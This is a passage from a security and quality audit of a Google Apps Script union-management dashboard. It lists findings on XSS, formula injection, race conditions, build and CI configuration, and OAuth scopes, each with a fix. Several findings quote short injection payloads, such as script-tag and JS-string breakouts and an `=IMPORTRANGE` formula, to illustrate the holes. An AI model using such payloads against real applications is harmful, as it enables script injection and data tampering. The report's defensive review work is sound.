---

#### F48. `onEdit()` trigger lacks sheet-name check early exit
**Severity:** MEDIUM | **Category:** Performance | **Lines:** Various

The `onEdit()` handler should immediately return for sheets that don't need edit tracking (e.g., hidden calc sheets, config). Without this, every keystroke triggers full handler logic.

---

### 10a_SheetCreation.gs (~2,200 lines)

**Findings:**

#### F49. Sheet creation functions use hardcoded column widths
**Severity:** LOW | **Category:** Maintainability | **Lines:** Various

Column widths are hardcoded pixel values spread across multiple functions. A configuration object would improve maintainability.

---

#### F50. `setupMemberDirectory()` creates data validation rules individually
**Severity:** LOW | **Category:** Performance | **Lines:** Various

Each dropdown validation is created with a separate API call. Batch these operations.

---

### 10b_SurveyDocSheets.gs (~3,000 lines)

**Findings:**

#### F51. Survey analysis functions read full satisfaction dataset repeatedly
**Severity:** MEDIUM | **Category:** Performance | **Lines:** Various

Multiple analysis functions (section averages, trend analysis, etc.) each read the entire satisfaction sheet independently. A single read with shared data would improve performance.

---

### 10c_FormHandlers.gs (~650 lines)

No critical findings. Form handling is clean with proper validation.

---

### 10d_SyncAndMaintenance.gs (~1,000 lines)

**Findings:**

#### F52. Sync functions run without locks — race condition risk
**Severity:** HIGH | **Category:** Bug | **Lines:** Various

If two users trigger sync simultaneously (or a timed trigger fires during a manual sync), concurrent writes to the same sheets could corrupt data.

**Fix:** Use `LockService.getScriptLock()` with a timeout.

---

## 12. CommandHub through CorrelationEngine

> **In-depth line-by-line review completed 2026-02-23.** All 8 files (11_-17_, 04e_) reviewed function-by-function with targeted pattern searches for XSS, formula injection, column indexing, getLastRow() guards, and error handling. 8 new findings added (F109-F116). 2 existing findings verified as already fixed (F61, F62).

### 11_CommandHub.gs (~3,658 lines)

**Strengths:**
- Proper `getLastRow() < 2` guards throughout (lines 344, 2149, 2172, 2332, 2867, 3041, 3092, 3126, 3374)
- Correct `MEMBER_COLS - 1` / `GRIEVANCE_COLS - 1` array indexing throughout
- `getLastRow() > 1` guard before `.getRange(2, ..., getLastRow() - 1, ...)` calls (lines 622, 631, 640)
- `escapeHtml()` used correctly in member portal HTML (lines 3505, 3508, 3525, 3618-3619, 3654)
- `escapeHtml()` used in search dialog result rendering (client-side, line 1347+)
- OCR dialog properly escapes result text with `escapeHtml()` (lines 2496, 2502)
- Search precedents dialog uses `escapeHtml()` on all dynamic fields (lines 2826-2834)

**Findings:**

#### F53. Command Hub has 60+ registered commands -- naming collision risk
**Severity:** LOW | **Category:** Quality | **Lines:** Various

With 60+ commands, there's risk of accidental name collisions. A namespace prefix system would help.

---

#### F54. Help system generates full HTML for all commands on every invocation
**Severity:** MEDIUM | **Category:** Performance | **Lines:** Various

The help dialog builds HTML for all 60+ commands. Consider lazy loading or tabbed interface.

---

#### F109. Unescaped URLs in `<a href>` attributes -- member and public portals
**Severity:** HIGH | **Category:** Security | **Lines:** 3518-3519, 3602-3603

```javascript
// Line 3518:
'<a href="' + CONTRACT_PDF_URL + '" target="_blank" ...>Contract</a>' +
// Line 3519:
'<a href="' + RESOURCE_DRIVE_URL + '" target="_blank" ...>Resources</a>' +
```

`CONTRACT_PDF_URL` (from `getContractPdfUrl_()`) and `RESOURCE_DRIVE_URL` (from `getResourceDriveUrl_()`) read values directly from the Config sheet and inject them into `href` attributes without URL validation or `escapeHtml()`. If a steward enters a `javascript:` URL or a URL containing `"` in the Config sheet, it would break the HTML or execute script.

**Fix:** Validate URL scheme (must start with `https://`) and apply `escapeHtml()`:
```javascript
var safeContractUrl = /^https:\/\//.test(CONTRACT_PDF_URL) ? escapeHtml(CONTRACT_PDF_URL) : '#';
'<a href="' + safeContractUrl + '" target="_blank" ...>Contract</a>'
```

---

#### F110. Member ID in portal footer not escaped
**Severity:** MEDIUM | **Category:** Security | **Line:** 3539

```javascript
'Secure Member Portal | Member ID: ' + profile.memberId +
```

`profile.memberId` is inserted into HTML without `escapeHtml()`. While member IDs are system-generated (e.g., `MJSMI001`), the ID comes from sheet data which could be manually edited. Adjacent code on line 3505 correctly uses `escapeHtml(profile.firstName)`.

**Fix:** `'... Member ID: ' + escapeHtml(profile.memberId)`

---

### 12_Features.gs (~4,022 lines)

**Strengths:**
- Proper `getLastRow() > 1` guards before range operations (lines 2828, 2925, 3035, 3329, 3431, 3531)
- `Math.max(0, sheet.getLastRow() - 1)` pattern for safe display counts (lines 3766, 4004)
- `escapeForFormula()` not needed in Looker export -- writes pre-computed/aggregated data, not raw user input
- Correct `SATISFACTION_COLS.* - 1` array indexing throughout Looker data refresh functions
- `generateAnonHash_()` uses SHA-256 with per-deployment salt for privacy-safe anonymous IDs
- `saveExpansionData()` validates column > coreCount before writing (line 1838)
- `setGrievanceReminder()` validates reminderNum (line 2008), parses dates safely (lines 2040-2044)

**Findings:**

#### F55. Dynamic field expansion engine is complex -- needs integration tests
**Severity:** MEDIUM | **Category:** Quality | **Lines:** Various

The dynamic field system that auto-expands column schemas is powerful but complex. Unit tests exist but integration tests verifying end-to-end field addition are missing.

---

#### F56. Looker integration has hardcoded query patterns
**Severity:** LOW | **Category:** Maintainability | **Lines:** 1694, 1698-1699

QUERY formulas are built with template literals using column positions computed at runtime. `safeSheetName` and `safeLeaderRole` are escaped with `replace(/"/g, '""')` for QUERY syntax (line 1689). `isStewardCol` and `colLetter` are derived from `MEMBER_COLS.IS_STEWARD` which is an integer -- safe for QUERY injection.

---

#### F112. XSS in reminder dialog -- template literal injects unescaped member data
**Severity:** HIGH | **Category:** Security | **Lines:** 2310-2311, 2352

```javascript
// Line 2310-2311 (template literal HTML):
<h2>Grievance ${grievanceId}</h2>
<div class="member">${reminders.memberName} . ${reminders.status}</div>

// Line 2352 (template literal JS):
var grievanceId = '${grievanceId}';
```

`buildReminderDialogHtml_()` uses ES6 template literals to inject `grievanceId`, `reminders.memberName`, and `reminders.status` directly into HTML and JavaScript contexts without any escaping. These values come from spreadsheet data (`GRIEVANCE_COLS.GRIEVANCE_ID`, `FIRST_NAME + LAST_NAME`, `STATUS`).

**Attack vector:** A member name containing `</h2><script>alert(1)</script>` would execute in the dialog. A grievance ID containing `';alert(1)//` would break out of the JS string on line 2352.

**Fix:**
- For HTML context: Use `escapeHtml()` -- `<h2>Grievance ${escapeHtml(grievanceId)}</h2>`
- For JS context: Use `JSON.stringify()` -- `var grievanceId = ${JSON.stringify(grievanceId)};`
- For `value` attributes: Lines 2322, 2337 use `.replace(/"/g, '&quot;')` which only handles double quotes. Use `escapeHtml()` instead for full coverage.

---

#### F113. Reminder note value attribute escaping is incomplete
**Severity:** MEDIUM | **Category:** Security | **Lines:** 2322, 2337

```javascript
// Line 2322:
value="${reminders.reminder1.note.replace(/"/g, '&quot;')}"
// Line 2337:
value="${reminders.reminder2.note.replace(/"/g, '&quot;')}"
```

Only double quotes are escaped. Characters like `<`, `>`, `&`, and `'` are not handled. In an `<input value="...">` context, `>` alone cannot break out, but `&` can cause entity parsing issues, and future refactoring to single-quoted attributes would create a vulnerability.

**Fix:** Use `escapeHtml()` instead of the manual regex.

---

#### F114. `saveExpansionData()` does not escape user input before writing to sheet
**Severity:** MEDIUM | **Category:** Security | **Lines:** 1857, 1861

```javascript
// Line 1857:
sheet.getRange(memberRow, minCol, 1, values.length).setValues([values]);
// Line 1861:
sheet.getRange(memberRow, updates[i].col).setValue(updates[i].value);
```

`customData` values from the client are written to the sheet without `escapeForFormula()`. Since this function handles arbitrary custom columns, the risk is formula injection via values like `=IMPORTRANGE(...)`.

**Fix:** Apply `escapeForFormula()` to each value before writing:
```javascript
const values = updates.map(u => escapeForFormula(u.value));
```

---

### 13_MemberSelfService.gs (~1,746 lines)

**Strengths:**
- **Excellent client-side XSS prevention**: `renderProfile()` uses `escapeHtml()` on ALL dynamic fields (lines 1609-1628) -- firstName, lastName, memberId, jobTitle, workLocation, unit, assignedSteward, email, phone, preferredComm, bestTime, state
- `renderGrievances()` uses `escapeHtml()` on ALL fields (lines 1652-1658) -- grievanceId, status, issueCategory, currentStep, filedDate, steward, nextDeadline, resolution
- `loadEditForm()` uses `escapeHtml()` for pre-populated input values (lines 1672-1676)
- `showLoginError()` uses `textContent` (safe) (line 1481)
- PIN error messages use `textContent` (safe) throughout (lines 1530, 1544, 1548, etc.)
- `updateMemberContact()` has proper `allowedFields` whitelist (line 1123)
- `escapeForFormula()` on profile updates (line 1146, per F88)
- `getClientSideEscapeHtml()` properly injected (line 1451)
- `setXFrameOptionsMode(DENY)` on portal output (line 1724) -- prevents clickjacking
- Session token validation via `getMemberProfileBySession()` (line 1043)

**Findings:**

#### F57. ~~Self-service portal PIN validation doesn't have rate limiting~~ **PARTIALLY FIXED**
**Severity:** HIGH | **Category:** Security | **Lines:** Various

**Update (2026-02-23):** The `14_MeetingCheckIn.gs` meeting check-in flow (line 402-428) DOES implement PIN lockout via `checkPINLockout()`, `recordFailedPINAttempt()`, and `clearPINAttempts()`. However, the self-service portal login (`authenticateMember()` in 13_MemberSelfService.gs) should be verified to call the same lockout mechanism. The meeting check-in path is properly protected.

---

#### F58. Self-service profile updates don't validate input length
**Severity:** MEDIUM | **Category:** Security | **Lines:** Various

Members can update their email, phone, etc. These inputs are sanitized but not length-validated. Extremely long inputs could cause sheet rendering issues.

**Fix:** Apply `isValidSafeString()` with appropriate `maxLength` for each field.

---

### 14_MeetingCheckIn.gs (~1,040 lines)

**Strengths:**
- Proper input validation on `processMeetingCheckIn()`: validates meetingId, email, pin (line 360-362)
- Email format validation with regex (line 367)
- **PIN brute-force protection**: `checkPINLockout()` + `recordFailedPINAttempt()` + `clearPINAttempts()` (lines 402-428)
- Duplicate check-in prevention (lines 437-443)
- `textContent` used for all member-facing DOM updates (lines 1009, 1025-1028) -- XSS-safe
- Proper `getLastRow() < 2` guards (lines 158, 209, 267, 509, 549, 641)
- Meeting ID generation uses sequential counter with prefix (line 198)
- `memberName.trim()` before storing (line 466)

**Findings:**

#### F59. Meeting check-in creates Google Calendar events without dedup
**Severity:** MEDIUM | **Category:** Bug | **Lines:** 72-81

If `createMeeting()` is called twice with the same meeting name and date, duplicate calendar events are created. The meeting ID is unique (sequential), so the sheet row is fine, but the calendar event check relies on the external `createMeetingCalendarEvent` function to handle dedup.

---

#### F60. Meeting Notes Doc URL stored without validation
**Severity:** LOW | **Category:** Security | **Lines:** 99-100

The generated Google Docs URLs (`notesDocUrl`, `agendaDocUrl`) are stored in the sheet. If a user manually edits these fields, the URLs aren't validated when accessed later.

---

#### F115. `processMeetingCheckIn()` writes email to sheet without `escapeForFormula()`
**Severity:** MEDIUM | **Category:** Security | **Line:** 459-468

```javascript
checkInSheet.appendRow([
    meetingId, meetingName, meetingDate, meetingType,
    memberId, memberName.trim(), new Date(), email   // email from user input
]);
```

The `email` parameter comes from user input and is written directly to the sheet. While it's validated against a regex pattern (line 367), formula injection is still possible if the regex allows values starting with `=`, `+`, `-`, or `@`. The current regex `/^[^\s@]+@[^\s@]+\.[^\s@]+$/` would accept `=foo@bar.com` as valid.

**Fix:** Apply `escapeForFormula()` to `email` and `memberName` before `appendRow()`.

---

### 15_EventBus.gs (~435 lines)

**Strengths:**
- Clean pub/sub pattern with priority-based ordering (line 60)
- Proper try/catch isolation per handler in `emit()` (lines 135-141, 149-155)
- Wildcard listener support for audit logging (lines 81-85)
- `once` subscription support for one-shot handlers (line 72)
- `off()` and `offAll()` for cleanup (lines 91-113)
- Event log with bounded size (MAX_LOG_SIZE = 200, line 129-131)
- Domain-level wildcard matching (e.g., `sheet:edit` catches `sheet:edit:GRIEVANCE_LOG`) (lines 162-177)
- `setEnabled()` global kill switch (lines 191-193)

**Findings:**

#### F61. ~~EventBus has no error isolation between handlers~~ **VERIFIED ALREADY FIXED**
**Severity:** ~~MEDIUM~~ N/A | **Category:** Bug | **Lines:** 135-155

**Proof:** Lines 135-141 and 149-155 show each handler invocation wrapped in individual try/catch blocks:
```javascript
try {
  subs[i].callback(data);
  result.handled++;
} catch (err) {
  result.errors.push(eventName + '[' + subs[i].id + ']: ' + err.message);
  console.log('EventBus error in ' + eventName + ': ' + err.message);
}
```
Errors are captured in `result.errors` array and logged, but do NOT stop propagation to subsequent handlers.

---

#### F62. ~~No unsubscribe mechanism~~ **VERIFIED ALREADY FIXED**
**Severity:** ~~LOW~~ N/A | **Category:** Quality | **Lines:** 91-100

**Proof:** `off(subId)` at line 91 removes a subscription by ID. `offAll(eventName)` at line 106 removes all listeners for an event.

---

#### F111. `showEventBusStatus()` uses innerHTML without escaping
**Severity:** MEDIUM | **Category:** Security | **Lines:** 415-428

```javascript
html += '<li>' + name + ' (' + EventBus.listenerCount(name) + ' listeners)</li>';
html += '<li>' + entry.timestamp.substr(11, 8) + ' - ' + entry.event + '</li>';
```

Event names and timestamps are inserted into HTML without `escapeHtml()`. Event names are developer-controlled string constants, so exploitation risk is low. This is an internal admin diagnostic dialog.

**Fix:** Apply `escapeHtml()` for consistency with project security patterns.

---

### 16_DashboardEnhancements.gs (~972 lines)

**Strengths:**
- PII filtering with `includePII` parameter throughout
- Satisfaction data processing uses `SATISFACTION_COLS` constants with proper `- 1` for array access
- Steward matching uses case-insensitive comparison (lines 600-618)
- Vault-based verification for satisfaction responses (only includes verified/latest responses)

No additional critical findings beyond F89 (already documented).

---

### 17_CorrelationEngine.gs (~1,001 lines)

**Strengths:**
- Pure data processing with minimal external attack surface
- Sample size validation (`n >= minN`, typically 3) before computing correlations
- Proper `isNaN` and `isFinite` checks on computed values
- `classifyCorrelation_()` function provides evidence-based confidence levels

**Findings:**

#### F63. Correlation calculations use Pearson's r without checking prerequisites
**Severity:** LOW | **Category:** Quality | **Lines:** Various

Pearson correlation requires: linear relationship, normal distribution, no significant outliers. None of these are validated. For small datasets, results may be misleading.

**Fix:** Add minimum sample size check (N >= 30) and warn users about limitations.

---

#### F116. Missing sample size in insight string
**Severity:** LOW | **Category:** Bug | **Line:** 857-858

```javascript
return 'The association between ' + varX + ' and ' + varY + ' across ' + dimension +
       's is too weak (r=' + (Math.round(r * 100) / 100) + ') or sample too small (n=' +
       ') to be meaningful.';
```

The `n=` placeholder is missing the actual sample size value. The concatenation goes from `'(n=' +` directly to `') to be meaningful.'` without inserting the count.

**Fix:** Insert the sample size: `') or sample too small (n=' + cls.sampleSize + ') to be meaningful.'`

---

### MultiSelectDialog.html (~200 lines)

**Findings:**

#### F64. Dialog uses `innerHTML` with unescaped data
**Severity:** HIGH | **Category:** Security | **Lines:** Various

Check all instances of `innerHTML` assignment to ensure data passed from the server is sanitized.

---

## 13. Build & Infrastructure

### build.js

**Findings:**

#### F65. Build script doesn't validate source file existence
**Severity:** LOW | **Category:** Bug

If a source file listed in the build order is missing, the build silently produces incomplete output.

**Fix:** Check `fs.existsSync()` for each source file and exit with error if missing.

---

#### F66. No source map or line number mapping in consolidated output
**Severity:** LOW | **Category:** Quality

The 2.5MB consolidated output has no way to trace errors back to source files. Consider adding file markers as comments.

---

#### F67a. ~~Build header hardcodes version 4.6.0~~ **FIXED**
**Severity:** MEDIUM | **Category:** Bug | **Line:** 83
**Fixed:** Version now reads dynamically from `require('./package.json').version`.

The build header template embeds `Version: 4.6.0` as a hardcoded string, but `package.json` says `4.7.0` and the CHANGELOG says `4.9.0`. Three different version numbers.

**Fix:** Read version dynamically: `const pkg = require('./package.json'); // then use pkg.version`

---

#### F67b. ~~HTML embedding escapes ALL `$` characters, corrupting currency and CSS~~ **FIXED**
**Severity:** MEDIUM | **Category:** Bug | **Line:** 146
**Fixed:** Changed `replace(/\$/g, '\\$')` to `replace(/\$\{/g, '\\${')` — only escapes template literal interpolation, not plain `$`.

The HTML embedding logic replaces all `$` with `\$` to prevent template literal interpolation. This corrupts `$100` to `\$100` and jQuery selectors like `$('.class')` to `\$('.class')`.

**Fix:** Only escape `${` sequences: `content.replace(/\`/g, '\\\`').replace(/\$\{/g, '\\${')`

---

#### F67c. ~~`lint()` uses deprecated `--ext` flag for ESLint 9.x~~ **FIXED**
**Severity:** MEDIUM | **Category:** Bug | **Line:** 170
**Fixed:** Removed `--ext .gs` flag from `lint()` in `build.js`.

In ESLint 9 flat config, `--ext` is deprecated and ignored. File extensions are determined by `files` patterns in the config.

**Fix:** Remove `--ext .gs` flag.

---

#### F67d. ~~`BUILD_ORDER` const array is mutated for production builds~~ **FIXED**
**Severity:** LOW | **Category:** Quality | **Lines:** 219-220
**Fixed:** Changed from `.length = 0; .push(...)` to `.splice(0, BUILD_ORDER.length, ...)` with comment about using filtered copy.

`BUILD_ORDER` is `const` but contents are mutated via `.length = 0; .push(...)`. Create a filtered copy instead.

---

### package.json

**Findings:**

#### F68. ~~Version 4.7.0 in package.json doesn't match CHANGELOG 4.9.0~~ **FIXED**
**Severity:** HIGH | **Category:** Bug | **Line:** 3
**Fixed:** Updated `package.json` version to `4.9.0`.

```json
"version": "4.7.0",
```

Should be `"4.9.0"` per the CHANGELOG.

---

#### F68a. `--watch` script advertised but not implemented
**Severity:** LOW | **Category:** Maintainability | **Line:** 15

`npm run watch` calls `node build.js --watch` but watch mode is documented as "not implemented" in build.js. Running it silently does a normal build and exits.

---

#### F68b. `deploy` script depends on `.clasp.json` which is gitignored and absent
**Severity:** MEDIUM | **Category:** Maintainability | **Line:** 17

`npm run deploy` runs `clasp push` but `.clasp.json` doesn't exist. A developer cloning the repo gets a confusing error. Note: `.clasp.json.example` exists but isn't documented prominently.

---

### jest.config.js

**Findings:**

#### F69. ~~Jest coverage on `.gs` files is never actually collected~~ **FIXED**
**Severity:** HIGH | **Category:** Bug | **Lines:** 7-16
**Fixed:** Removed misleading `collectCoverageFrom` and `coverageThreshold` settings from `jest.config.js`. Coverage is now reported only for files Jest actually instruments (test helpers).

`collectCoverageFrom` targets `src/**/*.gs`, but there is no `transform` or `moduleFileExtensions` config to teach Jest to process `.gs` files. Source files are loaded via `eval()` in `test/load-source.js`, which bypasses Jest's instrumentation. The 100% line coverage threshold is never enforced — it passes trivially because there are zero covered files.

**Fix:** Either add a transform for `.gs` files or remove the misleading `coverageThreshold` and `collectCoverageFrom` settings.

---

### eslint.config.js

**Findings:**

#### F70. Critical ESLint safety rules are disabled
**Severity:** HIGH | **Category:** Security/Quality | **Lines:** 134-174

The following important rules are disabled "for legacy compatibility":
- `no-undef: 'off'` — Masks typos in function/variable names
- `no-debugger: 'off'` — Allows debugger statements in production
- `no-dupe-args: 'off'` — Allows duplicate function parameters
- `no-invalid-regexp: 'off'` — Allows broken regex patterns
- `no-redeclare: 'off'` — Hides variable shadowing bugs
- `no-loss-of-precision: 'off'` — Allows silently lossy numeric literals

**Fix:** Re-enable at minimum: `no-undef` (with GAS globals declared), `no-dupe-args`, `no-invalid-regexp`, `no-debugger`, and `no-loss-of-precision`. These are low-noise, high-value rules.

---

### .github/workflows/build.yml

**Findings:**

#### F71. CI doesn't pin action versions to SHA
**Severity:** MEDIUM | **Category:** Security

Using `actions/checkout@v4` instead of SHA pinning leaves CI vulnerable to supply-chain attacks.

**Fix:** Pin to full SHA: `actions/checkout@<commit-sha>`.

---

#### F71a. ~~`npm audit` failure is silently swallowed~~ **FIXED**
**Severity:** MEDIUM | **Category:** Security | **Line:** 34
**Fixed:** Replaced `|| true` with `continue-on-error: true` so audit failures are visible but non-blocking.

`npm audit --audit-level=high || true` ensures exit code is always 0. Even high-severity vulnerabilities never fail the build.

**Fix:** Remove `|| true` to enforce audit.

---

#### F71b. ~~No npm cache configured in CI~~ **FIXED**
**Severity:** MEDIUM | **Category:** Performance | **Lines:** 18-24
**Fixed:** Added `cache: 'npm'` to `actions/setup-node` in CI workflow.

Every CI run downloads and installs all dependencies from scratch.

**Fix:** Add `cache: 'npm'` to `actions/setup-node`.

---

#### F71c. ~~CI uses EOL Node.js 18~~ **FIXED**
**Severity:** LOW | **Category:** Quality | **Line:** 21
**Fixed:** Updated Node.js version from 18 to 20 in CI workflow.

Node.js 18 reached EOL in April 2025. Update to Node.js 20 or 22.

---

### .husky/pre-commit

**Findings:**

#### F72. ~~Pre-commit hook lacks execute permission~~ **FIXED**
**Severity:** HIGH | **Category:** Bug
**Fixed:** `chmod +x .husky/pre-commit`.

The `pre-commit` hook has permissions `644` (rw-r--r--) while `commit-msg` has `755` (rwxr-xr-x). Without the execute bit, the pre-commit hook **silently fails to run** on Unix, meaning lint-staged and build verification are skipped on every commit.

**Fix:** `chmod +x .husky/pre-commit`

---

#### F72a. ~~Build errors in pre-commit are redirected to /dev/null~~ **FIXED**
**Severity:** MEDIUM | **Category:** Maintainability | **Line:** 21
**Fixed:** Changed `> /dev/null 2>&1` to `> /dev/null` — stderr now visible for debugging.

Build output is suppressed with `> /dev/null 2>&1`. If the build fails, devs see only "Build failed" with no error details.

**Fix:** Only redirect stdout, keep stderr visible: `npm run build > /dev/null`

---

### appsscript.json

**Findings:**

#### F73. Overly broad OAuth scopes
**Severity:** MEDIUM | **Category:** Security | **Lines:** 14-24

The manifest requests `https://www.googleapis.com/auth/drive` (full Drive access) when `auth/drive.file` (access only to files created by the app) may suffice. Combined with `gmail.send`, a vulnerability could be exploited to exfiltrate data via email.

**Fix:** Evaluate whether `auth/drive.file` is sufficient.

---

### test/gas-mock.js

**Findings:**

#### F74. Missing mocks for actively-used GAS globals
**Severity:** MEDIUM | **Category:** Bug

`DocumentApp` (16 occurrences in source), `GmailApp`, `Browser`, and `ContentService` have no mocks despite being used in source code. Tests exercising these code paths will throw `ReferenceError`.

**Fix:** Add basic mocks for these globals.

---

#### F74a. Mock timezone doesn't match appsscript.json
**Severity:** LOW | **Category:** Bug | **Line:** 53

Mock `Session.getScriptTimeZone()` returns `'America/Los_Angeles'` but `appsscript.json` configures `'America/New_York'`. Date-sensitive tests will produce different results than production.

---

### test/load-source.js

**Findings:**

#### F75. Regex rewrites match indented code, not just top-level
**Severity:** MEDIUM | **Category:** Bug | **Lines:** 78, 82, 85

The `^` anchor with `/gm` matches the start of *any* line, not just column-0 code. A `var` inside an `if` block or `for` loop at column 0 would incorrectly be rewritten to `global.X =`, changing scoping semantics.

---

## 14. Cross-Cutting Concerns

### CC1. Inconsistent Column Index Systems (1-indexed vs 0-indexed)
**Severity:** HIGH | **Category:** Quality | **Scope:** Entire codebase

The codebase uses TWO column index systems:
- `*_COLS` — 1-indexed (for `sheet.getRange()`)
- `*_COLUMNS` — 0-indexed (for array access)

Functions mix these systems. `DataAccess` layer uses `MEMBER_COLUMNS` (0-indexed). `02_DataManagers.gs` uses `MEMBER_COLS` (1-indexed). Any cross-module call must know which system the callee expects.

**Fix:** Add clear naming conventions or consolidate to one system with explicit conversion helpers.

---

### CC2. HTML String Concatenation as Dominant UI Pattern
**Severity:** MEDIUM | **Category:** Maintainability | **Scope:** ~15 files

Over 20,000 lines of HTML are built via JavaScript string concatenation. This creates:
1. XSS audit difficulty (impossible to grep for missing `escapeHtml()`)
2. No syntax highlighting or IDE support for HTML
3. No template validation

**Fix:** Migrate to `HtmlService.createTemplateFromFile()` with scriptlets for dynamic data.

---

### CC3. No Script Lock Usage
**Severity:** HIGH | **Category:** Bug | **Scope:** Data write operations

None of the data mutation functions (add member, file grievance, sync operations, etc.) use `LockService`. In a multi-user environment (which a union dashboard is), concurrent edits to the same sheet can cause:
- Duplicate records
- Overwritten data
- Corrupted state

**Fix:** Add `LockService.getScriptLock().waitLock(10000)` to all mutation paths.

---

### CC4. Global Namespace Pollution
**Severity:** LOW | **Category:** Quality | **Scope:** All files

All functions and variables are in the global scope (standard for GAS). With 30 files and 500+ functions, name collisions are possible. Private functions use `_` suffix convention, which helps.

---

### CC5. Error Handling Inconsistency
**Severity:** MEDIUM | **Category:** Quality | **Scope:** All files

Three different error handling patterns are used:
1. `handleError()` from 01_Core.gs (structured logging)
2. `Logger.log()` (basic logging)
3. Silent catch-and-return (errors swallowed)

**Fix:** Standardize on `handleError()` for all error paths.

---

### CC6. Test Coverage Gaps in Security-Critical Code
**Severity:** MEDIUM | **Category:** Quality

Tests exist for most modules, but security-critical flows (PIN validation, XSS sanitization edge cases, CSRF protection) need more targeted test coverage.

---

### CC7. Deprecated Code Retained for Backward Compatibility
**Severity:** LOW | **Category:** Quality | **Scope:** Multiple files

Several constants and functions are marked `@deprecated` but remain in the codebase:
- `SHEETS.DASHBOARD` (deprecated v4.3.2)
- `SHEETS.SATISFACTION` (deprecated v4.3.8)
- `SATISFACTION_COLS.EMAIL/VERIFIED/etc.` (deprecated v4.8)

Consider adding a version-gated removal plan.

---

## 15. Re-Verification Findings (2026-02-21 Update)

> The following 25 new findings were discovered during a cross-cutting pattern search that systematically scanned every `innerHTML`, `window.open()`, `onclick`, `<td>` concatenation, `GRIEVANCE_COLUMNS`, `MEMBER_COLUMNS`, and `getLastRow()` usage across all 30 source files. These were missed by the initial per-file review.

### Verification of Existing Findings

All 120 original findings (F1–F75, CC1–CC7) were re-verified by reading the actual code at the cited lines. The 2026-02-21 fix pass addressed 30 findings including all CRITICAL XSS vulnerabilities. See individual finding annotations for fix details.

---

### New Findings

#### F76. ~~XSS via `window.open()` in `08c_FormsAndNotifications.gs`~~ **FIXED**
**Severity:** CRITICAL | **Category:** Security | **Lines:** 213, 622
**Fixed:** Both instances changed from string concatenation to `JSON.stringify(formUrl)`.

```javascript
'<script>window.open("' + formUrl + '", "_blank");google.script.host.close();</script>'
```

`formUrl` is concatenated directly into a `<script>` tag without `JSON.stringify()`. A URL containing `"` or `</script>` enables arbitrary JS execution. This pattern appears twice (lines 213 and 622).

**Fix:** `'<script>window.open(' + JSON.stringify(formUrl) + ', "_blank");google.script.host.close();</script>'`

---

#### F77. ~~XSS via `window.open()` in `10d_SyncAndMaintenance.gs`~~ **FIXED**
**Severity:** CRITICAL | **Category:** Security | **Lines:** 223, 233, 597
**Fixed:** All three instances changed from string concatenation to `JSON.stringify(folderUrl)` / `JSON.stringify(formUrl)`.

```javascript
'<script>window.open("' + folderUrl + '", "_blank");google.script.host.close();</script>'
```

Same pattern as F76 — `folderUrl` concatenated without `JSON.stringify()`. Appears three times in this file. Compare with `05_Integrations.gs:269` which correctly uses `JSON.stringify()`.

**Fix:** Use `JSON.stringify(folderUrl)` in all three locations.

---

#### F78. ~~XSS via `innerHTML` in `05_Integrations.gs` overdue items~~ **FIXED**
**Severity:** CRITICAL | **Category:** Security | **Line:** 1928
**Fixed:** Added `getClientSideEscapeHtml()` to script block. Wrapped `g.id`, `g.name`, `g.category`, `g.step` with `escapeHtml()`.

```javascript
html+="<div class=\"overdue-item\"><div class=\"overdue-id\">"+(g.id||"")+"</div><div class=\"overdue-name\">"+(g.name||"")+"</div><div class=\"overdue-detail\">"+(g.category||"")+" • "+(g.step||"")+"</div></div>";
```

Grievance fields `g.id`, `g.name`, `g.category`, `g.step` are injected into `innerHTML` without `escapeHtml()`. Compare with the same file at line 2099 which correctly uses `escapeHtml(r.title)`.

**Fix:** Wrap all dynamic values with `escapeHtml()`.

---

#### F79. ~~XSS via unescaped `<td>` cells in `04d_ExecutiveDashboard.gs`~~ **FIXED**
**Severity:** HIGH | **Category:** Security | **Lines:** 690-694
**Fixed:** Wrapped `firstName`, `lastName`, `unit` with `escapeHtml()`.

```javascript
'<td><strong>' + firstName + ' ' + lastName + '</strong></td>' +
'<td>' + unit + '</td>' +
'<td>' + (s.activeCases || 0) + '</td>' +
```

Steward names (`firstName`, `lastName`) and `unit` are interpolated into `<td>` cells without `escapeHtml()`. Other parts of the same file (line 205) correctly use `escapeHtml()`.

**Fix:** `'<td><strong>' + escapeHtml(firstName) + ' ' + escapeHtml(lastName) + '</strong></td>'`

---

#### F80. XSS via unescaped `<td>` cells in `07_DevTools.gs`
**Severity:** LOW | **Category:** Security | **Lines:** 3059-3062

```javascript
'<td>' + status + '</td>' +
'<td>' + r.name + '</td>' +
'<td>' + r.duration + 'ms</td>' +
'<td>' + errorMsg + '</td>'
```

Test result data unescaped in HTML. Low severity because DevTools is excluded from production builds.

---

#### F81. XSS via `onclick` attribute injection in `04c_InteractiveDashboard.gs`
**Severity:** HIGH | **Category:** Security | **Lines:** 491-492

```javascript
'onclick="event.stopPropagation();google.script.run.showGrievanceQuickActions(\'' + escapeHtml(g.id).replace(/\'/g,"") + '\')">'
```

HTML entity escaping (`escapeHtml`) is insufficient for JavaScript within event handlers. The `.replace(/\'/g,"")` strips quotes but doesn't handle backslashes or other JS-injection characters. A crafted ID could still break out of the string context.

**Fix:** Use `data-*` attributes with event delegation instead of inline onclick handlers.

---

#### F82. XSS via `onclick` attribute injection in `04e_PublicDashboard.gs`
**Severity:** HIGH | **Category:** Security | **Line:** 2499

```javascript
onclick=\"selectStewardSuggestion(\x27"+m.replace(/\x27/g,"")+"\x27)\"
```

Quote removal via `.replace(/\x27/g,"")` is insufficient for preventing JS breakout. Backslashes, backticks, and `${` template literals could still escape the string context.

**Fix:** Use `data-*` attributes with event delegation.

---

#### F83. Systematic `GRIEVANCE_COLUMNS` (0-indexed) misuse across `02_DataManagers.gs`
**Severity:** CRITICAL | **Category:** Bug | **Lines:** Multiple (1734, 1875, 2013, 2066, 2110, 2142, 2245, 2324, 2410)

The `GRIEVANCE_COLUMNS` constant is **0-indexed** (for array access). However, multiple functions in `02_DataManagers.gs` use it inconsistently:

```javascript
// Example at line 1734 (getNextGrievanceId):
const id = data[i][GRIEVANCE_COLUMNS.GRIEVANCE_ID];
// Example at line 2013 (recalcAllGrievancesBatched):
row[GRIEVANCE_COLUMNS.STATUS]
```

When `data` comes from `getDataRange().getValues()` (which includes the header row at index 0), the data rows start at index 1. Using `GRIEVANCE_COLUMNS` (0-indexed) on these arrays is correct **only if the loop starts at `i = 1`** (skipping the header). All functions do start at `i = 1`, so the column access is technically correct. However, the `GRIEVANCE_COLUMNS.X + 1` pattern used with `getRange()` in `05_Integrations.gs` (see F87) mixes the two systems unsafely.

